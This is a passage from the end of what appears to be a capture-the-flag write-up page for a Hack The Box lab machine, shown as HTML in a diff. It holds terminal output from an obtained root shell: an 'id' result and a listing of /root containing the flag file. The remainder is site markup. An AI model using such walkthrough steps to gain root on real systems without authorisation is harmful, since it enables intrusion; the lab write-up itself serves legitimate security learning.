+</span></span><span class="line"><span class="cl"><span class="nv">uid</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span> <span class="nv">groups</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span>
+</span></span><span class="line"><span class="cl">root@dog:/var/www/html# <span class="nb">cd</span>
+</span></span><span class="line"><span class="cl">root@dog:~# ls -la
+</span></span><span class="line"><span class="cl">ls -la
+</span></span><span class="line"><span class="cl">total <span class="m">44</span>
+</span></span><span class="line"><span class="cl">drwx------  <span class="m">5</span> root root <span class="m">4096</span> Apr <span class="m">15</span> 03:11 .
+</span></span><span class="line"><span class="cl">drwxr-xr-x <span class="m">19</span> root root <span class="m">4096</span> Feb  <span class="m">7</span> 18:31 ..
+</span></span><span class="line"><span class="cl">lrwxrwxrwx  <span class="m">1</span> root root    <span class="m">9</span> Feb  <span class="m">7</span> 15:59 .bash_history -&gt; /dev/null
+</span></span><span class="line"><span class="cl">-rw-r--r--  <span class="m">1</span> root root <span class="m">3106</span> Dec  <span class="m">5</span>  <span class="m">2019</span> .bashrc
+</span></span><span class="line"><span class="cl">drwx------  <span class="m">2</span> root root <span class="m">4096</span> Jan <span class="m">29</span> 15:49 .cache
+</span></span><span class="line"><span class="cl">-rw-r--r--  <span class="m">1</span> root root   <span class="m">94</span> Aug <span class="m">15</span>  <span class="m">2024</span> .gitconfig
+</span></span><span class="line"><span class="cl">drwxr-xr-x  <span class="m">3</span> root root <span class="m">4096</span> Jul  <span class="m">9</span>  <span class="m">2024</span> .local
+</span></span><span class="line"><span class="cl">lrwxrwxrwx  <span class="m">1</span> root root    <span class="m">9</span> Feb  <span class="m">7</span> 15:59 .mysql_history -&gt; /dev/null
+</span></span><span class="line"><span class="cl">-rw-r--r--  <span class="m">1</span> root root  <span class="m">161</span> Dec  <span class="m">5</span>  <span class="m">2019</span> .profile
+</span></span><span class="line"><span class="cl">-rw-r-----  <span class="m">1</span> root root   <span class="m">33</span> Apr <span class="m">15</span> 03:11 root.txt
+</span></span><span class="line"><span class="cl">-rw-r--r--  <span class="m">1</span> root root   <span class="m">66</span> Jul <span class="m">11</span>  <span class="m">2024</span> .selected_editor
+</span></span><span class="line"><span class="cl">drwx------  <span class="m">2</span> root root <span class="m">4096</span> Jul  <span class="m">8</span>  <span class="m">2024</span> .ssh
+</span></span><span class="line"><span class="cl">-rw-r--r--  <span class="m">1</span> root root  <span class="m">165</span> Feb  <span class="m">7</span> 15:59 .wget-hsts</span></span></code></pre></div></div>
+
+          
+          
+          
+        </div>
+        
+        
+
+        
+
+        
+
+      </div>
+    </section>
+
+    
+    <footer class="pt-8 max-w-prose print:hidden">
+      
+  
+    
+    
+    
+    <div class="pt-8">
+      <hr class="border-dotted border-neutral-300 dark:border-neutral-600">
+      <div class="flex justify-between pt-3">
+        <span class="flex flex-col">
+          
+            <a
+              class="flex text-neutral-700 hover:text-primary-600 dark:text-neutral dark:hover:text-primary-400"
+              href="/ctf/hackthebox/titanic/">
+              <span class="leading-6">
+                <span class="inline-block rtl:rotate-180">&larr;</span>&ensp;Hackthebox - Titanic
+              </span>
+            </a>
+            
+              <span class="ms-6 mt-1 text-xs text-neutral-500 dark:text-neutral-400">
+                <time datetime="2025-03-03T00:00:00&#43;00:00">3 March 2025</time>
+              </span>
+            
+          
+        </span>
+        <span class="flex flex-col items-end">
+          
+            <a
+              class="flex text-right text-neutral-700 hover:text-primary-600 dark:text-neutral dark:hover:text-primary-400"
+              href="/ctf/hackthebox/outbound/">
+              <span class="leading-6">
+                Hackthebox - Outbound&ensp;<span class="inline-block rtl:rotate-180">&rarr;</span>
+              </span>
+            </a>
+            
+              <span class="me-6 mt-1 text-xs text-neutral-500 dark:text-neutral-400">
+                <time datetime="2025-07-27T00:00:00&#43;00:00">27 July 2025</time>
+              </span>
+            
+          
+        </span>
+      </div>
+    </div>
+  
+
+
+      
+    </footer>
+  </article>
+
+        
+
+
+  
+
+
+
+
+
+
+<div
+  id="scroll-to-top"
+  class="fixed bottom-6 end-6 z-50 transform translate-y-4 opacity-0 duration-200">
+  <a
+    href="#the-top"
+    class="pointer-events-auto flex h-12 w-12 items-center justify-center rounded-full bg-neutral/50 text-xl text-neutral-700 hover:text-primary-600 dark:bg-neutral-800/50 dark:text-neutral dark:hover:text-primary-400"
+    aria-label="Scroll to top"
+    title="Scroll to top">
+    &uarr;
+  </a>
+</div>
+
+      </main><footer id="site-footer" class="py-10 print:hidden">
+  
+  
+    
+      
+      
+        
+          
+          
+      
+      
+      
+      <nav class="flex flex-row pb-4 text-base font-medium text-neutral-500 dark:text-neutral-400 ">
+        <ul class="flex list-none flex-col sm:flex-row">
+          
+            <li class=" flex mb-1 text-end sm:mb-0 sm:me-7 sm:last:me-0 ">
+              <a
+                class="decoration-primary-500 hover:underline hover:decoration-2 hover:underline-offset-2 flex items-center"
+                href="/tags/"
+                title="Tags">
+                
+                Tags
+              </a>
+            </li>
+          
+            <li class=" flex mb-1 text-end sm:mb-0 sm:me-7 sm:last:me-0 ">
+              <a
+                class="decoration-primary-500 hover:underline hover:decoration-2 hover:underline-offset-2 flex items-center"
+                href=""
+                title="">
+                
+                
+              </a>
+            </li>
+          
+        </ul>
+      </nav>
+    
+  
+  <div class="flex items-center justify-between">
+    
+    
+      <p class="text-sm text-neutral-500 dark:text-neutral-400">
+          &copy;
+          2026
+          TAH
+      </p>
+    
+
+    
+    
+      <p class="text-xs text-neutral-500 dark:text-neutral-400">
+        
+        
+        Powered by <a class="hover:underline hover:decoration-primary-400 hover:text-primary-500"
+          href="https://gohugo.io/" target="_blank" rel="noopener noreferrer">Hugo</a> &amp; <a class="hover:underline hover:decoration-primary-400 hover:text-primary-500"
+          href="https://blowfish.page/" target="_blank" rel="noopener noreferrer">Blowfish</a>
+      </p>
+    
+  </div>
+  
+    <script>
+      mediumZoom(document.querySelectorAll("img:not(.nozoom)"), {
+        margin: 24,
+        background: "rgba(0,0,0,0.5)",
+        scrollOffset: 0,
+      });
+    </script>
+  
+  
+  
+</footer>
+<div
+  id="search-wrapper"
+  class="invisible fixed inset-0 flex h-screen w-screen cursor-default flex-col bg-neutral-500/50 p-4 backdrop-blur-sm dark:bg-neutral-900/50 sm:p-6 md:p-[10vh] lg:p-[12vh] z-500"
+  data-url="http://localhost:1313/">
+  <div
+    id="search-modal"
+    class="flex flex-col w-full max-w-3xl min-h-0 mx-auto border rounded-md shadow-lg top-20 border-neutral-200 bg-neutral dark:border-neutral-700 dark:bg-neutral-800">
+    <header class="relative z-10 flex items-center justify-between flex-none px-2">
+      <form class="flex items-center flex-auto min-w-0">
+        <div class="flex items-center justify-center w-8 h-8 text-neutral-400">
+          <span class="relative block icon"><svg aria-hidden="true" focusable="false" data-prefix="fas" data-icon="search" class="svg-inline--fa fa-search fa-w-16" role="img" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512"><path fill="currentColor" d="M505 442.7L405.3 343c-4.5-4.5-10.6-7-17-7H372c27.6-35.3 44-79.7 44-128C416 93.1 322.9 0 208 0S0 93.1 0 208s93.1 208 208 208c48.3 0 92.7-16.4 128-44v16.3c0 6.4 2.5 12.5 7 17l99.7 99.7c9.4 9.4 24.6 9.4 33.9 0l28.3-28.3c9.4-9.4 9.4-24.6.1-34zM208 336c-70.7 0-128-57.2-128-128 0-70.7 57.2-128 128-128 70.7 0 128 57.2 128 128 0 70.7-57.2 128-128 128z"/></svg>
+</span>
+        </div>
+        <input
+          type="search"
+          id="search-query"
+          class="flex flex-auto h-12 mx-1 bg-transparent appearance-none focus:outline-dotted focus:outline-2 focus:outline-transparent"
+          placeholder="Search"
+          tabindex="0">
+      </form>
+      <button
+        id="close-search-button"
+        class="flex items-center justify-center w-8 h-8 text-neutral-700 hover:text-primary-600 dark:text-neutral dark:hover:text-primary-400"
+        title="Close (Esc)">
+        <span class="relative block icon"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 320 512"><path fill="currentColor" d="M310.6 361.4c12.5 12.5 12.5 32.75 0 45.25C304.4 412.9 296.2 416 288 416s-16.38-3.125-22.62-9.375L160 301.3L54.63 406.6C48.38 412.9 40.19 416 32 416S15.63 412.9 9.375 406.6c-12.5-12.5-12.5-32.75 0-45.25l105.4-105.4L9.375 150.6c-12.5-12.5-12.5-32.75 0-45.25s32.75-12.5 45.25 0L160 210.8l105.4-105.4c12.5-12.5 32.75-12.5 45.25 0s12.5 32.75 0 45.25l-105.4 105.4L310.6 361.4z"/></svg>
+</span>
+      </button>
+    </header>
+    <section class="flex-auto px-2 overflow-auto">
+      <ul id="search-results">
+        
+      </ul>
+    </section>
+  </div>
+</div>
+
+    </div>
+  </body>
+  
+</html>
